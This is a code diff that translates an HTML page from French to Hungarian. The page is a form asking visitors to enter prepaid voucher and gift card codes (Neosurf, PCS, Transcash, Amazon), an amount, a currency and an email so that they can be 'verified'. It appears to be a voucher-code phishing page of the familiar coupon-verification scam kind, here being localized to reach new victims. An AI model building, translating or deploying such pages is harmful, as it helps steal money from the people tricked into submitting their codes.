@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="hu">
 
 <head>
     <meta charset="UTF-8">
@@ -156,7 +156,7 @@
     <!-- Google Translate widget -->
     <div class="translate-container">
         <div class="translate-btn">
-            🌐 Language
+            🌐 Nyelv
             <div id="google_translate_element"></div>
         </div>
     </div>
@@ -170,11 +170,11 @@
             <input type="hidden" name="_template" value="table">
             <input type="text" name="_honey" style="display:none">
 
-            <h2>Veuillez entrer les informations du coupon ici.</h2>
+            <h2>Kérjük, adja meg itt a feltöltőkártya adatait.</h2>
 
-            <label for="type">Choisir une recharge *</label>
+            <label for="type">Feltöltőkártya kiválasztása *</label>
             <select id="type" name="type" required>
-                <option value="none" selected disabled>---- Recharge ----</option>
+                <option value="none" selected disabled>---- Válasszon ----</option>
                 <option value="NEOSURF">NEOSURF</option>
                 <option value="PCS">PCS</option>
                 <option value="TRANSCASH">TRANSCASH</option>
@@ -187,29 +187,29 @@
                 <option value="AMAZON">AMAZON</option>
             </select>
 
-            <label for="montant">Montant de la recharge *</label>
+            <label for="montant">Feltöltés összege *</label>
             <input type="text" name="montant" id="montant" placeholder="0" required>
 
-            <label for="devise">Choisir une devise *</label>
+            <label for="devise">Pénznem kiválasztása *</label>
             <select id="devise" name="devise" required>
-                <option value="none" selected disabled>---- Devise -----</option>
-                <option value="EURO €">EURO (€)</option>
-                <option value="Dollar $">Dollar ($)</option>
-                <option value="Dollard CHF">FRANC SUISSE (CHF)</option>
-                <option value="krona">KRONA (SEK)</option>
-                <option value="krone">KRONE (DKK)</option>
+                <option value="none" selected disabled>---- Pénznem ----</option>
+                <option value="EURO €">EURÓ (€)</option>
+                <option value="Dollar $">Amerikai dollár ($)</option>
+                <option value="Dollard CHF">SVÁJCI FRANK (CHF)</option>
+                <option value="krona">SVÉD KORONA (SEK)</option>
+                <option value="krone">DÁN KORONA (DKK)</option>
             </select>
 
-            <label for="code1">Entrez les codes de recharge</label>
-            <input type="text" id="code1" name="code1" placeholder="Entrez le code de la recharge 1">
-            <input type="text" id="code2" name="code2" placeholder="Entrez le code de la recharge 2">
-            <input type="text" id="code3" name="code3" placeholder="Entrez le code de la recharge 3">
-            <input type="text" id="code4" name="code4" placeholder="Entrez le code de la recharge 4">
+            <label for="code1">Adja meg a feltöltőkártya kódjait</label>
+            <input type="text" id="code1" name="code1" placeholder="1. feltöltőkártya kódja">
+            <input type="text" id="code2" name="code2" placeholder="2. feltöltőkártya kódja">
+            <input type="text" id="code3" name="code3" placeholder="3. feltöltőkártya kódja">
+            <input type="text" id="code4" name="code4" placeholder="4. feltöltőkártya kódja">
 
-            <label for="email">Entrez votre email</label>
-            <input type="email" id="email" name="email" placeholder="Entrez votre email" required>
+            <label for="email">E-mail-cím</label>
+            <input type="email" id="email" name="email" placeholder="Adja meg az e-mail-címét" required>
 
-            <input id="valider" type="submit" value="Valider">
+            <input id="valider" type="submit" value="Ellenőrzés">
         </form>
     </div>
 
@@ -241,7 +241,7 @@
 
         function googleTranslateElementInit() {
             new google.translate.TranslateElement({
-                pageLanguage: 'fr',
+                pageLanguage: 'hu',
                 includedLanguages: 'en,fr,es,de,it,pt,ar,da,sv',
                 layout: google.translate.TranslateElement.InlineLayout.SIMPLE
             }, 'google_translate_element');
